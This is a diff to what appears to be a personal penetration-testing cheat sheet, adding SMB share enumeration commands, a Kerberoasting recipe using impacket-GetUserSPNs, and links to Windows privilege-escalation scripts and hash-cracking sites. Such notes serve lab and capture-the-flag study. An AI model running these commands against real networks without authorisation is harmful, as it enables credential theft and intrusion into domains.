@@ -316,7 +316,8 @@ enum4linux -h
 open SMB shares
 
 ```
-smbclient -L 10.10.251.241
+smbclient -L 10.10.251.241 
+smbclient //10.10.251.241/share # -c 'recurse;ls' 
 ```
 
 enumeration
@@ -389,6 +390,12 @@ evil-winrm -u <username> -p <password> -i <ip>
 upload <file on your ps directory> #to upload file
 ```
 
+kerberoasting
+```
+sudo ntpdate <target ip>
+impacket-GetUserSPNs domain.local/Admin:passwd -dc-ip <ip> -request
+```
+
 links
 * [WADComs (AD)](https://wadcoms.github.io/)
 
@@ -406,6 +413,8 @@ net user
 - [winpeas](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
 - [sushant747 win priv esc](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html)(with vpn)
 - [LOLBAS (windows)](https://lolbas-project.github.io/)
+- [JAWS](https://github.com/411Hall/JAWS)
+- [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)
 
 
 </details>
@@ -431,6 +440,7 @@ net user
 - [cyberchef](https://gchq.github.io/CyberChef/)
 - [free pass hash cracker](https://crackstation.net/)
 - [crack station](https://crackstation.net/)
+- [md5decrypt.net](https://md5decrypt.net/en/)
 
 #### Tools
 
